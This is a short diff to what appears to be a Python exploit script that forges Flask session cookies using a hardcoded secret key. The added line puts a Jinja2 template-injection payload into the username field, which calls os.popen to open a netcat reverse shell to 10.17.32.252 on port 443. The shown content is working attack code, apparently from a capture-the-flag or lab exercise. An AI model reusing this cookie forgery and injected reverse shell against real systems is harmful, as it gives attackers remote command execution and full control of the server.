@@ -5,7 +5,7 @@ from itsdangerous import base64_decode
 import ast
 from flask.sessions import SecureCookieSessionInterface
 
-cookie_data = '{"auth":"True", "username":"admin"}'
+cookie_data = '{"auth":"True", "username":"{{config.__class__.__init__.__globals__[\'os\'].popen(\'mkfifo /tmp/ZTQ0Y; nc 10.17.32.252 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y\').read()}}"}'
 secret_key = "d0ed883395f400fab54b1cd17b433c3a"
 
 class MockApp(object):
